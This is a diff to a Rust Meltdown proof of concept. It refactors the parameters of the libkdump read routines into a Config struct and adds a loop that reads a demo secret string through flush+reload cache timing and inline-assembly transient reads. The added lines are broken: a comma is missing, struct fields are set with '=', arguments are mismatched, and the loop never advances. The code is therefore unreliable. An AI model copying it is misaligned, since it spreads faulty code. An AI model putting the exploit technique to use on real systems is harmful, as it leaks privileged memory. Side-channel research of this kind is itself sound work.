@@ -14,6 +14,12 @@ use core::arch::asm;
 #[allow(dead_code)]
 pub struct MemoryPage([u128; 256]);
 
+pub struct Config {
+	measurements: u32,
+	accept_after: u32,
+	retries: u32,
+}
+
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u128) {
     unsafe {
         asm!(
@@ -73,8 +79,8 @@ pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bo
     end_time - start_time < cache_miss_threshold
 }
 
-pub fn libkdump_read_signal_handler(retries: u32, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
-	for _ in 0..retries {
+pub fn libkdump_read_signal_handler(config: Config cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
+	for _ in 0..config.retries {
 		// TODO: Set segmentation fault callback position
 		meltdown_fast(mem, pointer);
 			
@@ -92,15 +98,15 @@ pub fn libkdump_read_signal_handler(retries: u32, cache_miss_threshold: u64, mem
 	return 0;
 }
 
-pub fn libkdump_read(measurements: u32, retries: u32, cache_miss_threshold: u64, mem: &[MemoryPage], accept_after: u32, pointer: *const u128) -> u32 {
+pub fn libkdump_read(config: Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> u32 {
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
 	// TODO: original has sched_yield(); here
 	
-	for _ in 0..measurements {
+	for _ in 0..config.measurements {
 		// TODO: Add implementation using TSX?
-		let r = libkdump_read_signal_handler(retries, cache_miss_threshold, mem, pointer);
+		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
 		res_stat[r] += 1;
 	}
 	
@@ -153,6 +159,11 @@ pub fn main() {
     println!("Meltdown start\n");
     const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
+    let default_config = Config {
+		measurements = 3,
+		accept_after = 1,
+		retries = 10000,
+	};
     
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
@@ -162,4 +173,9 @@ pub fn main() {
     for i in 0..ARRAY_SIZE {
         flush(&mem[i] as *const MemoryPage);
     }
+    
+    let mut index = 0;
+    while index < SECRET.len() {
+		let value = libkdump_read(default_config, SECRET[index] as *const u128);
+	}
 }
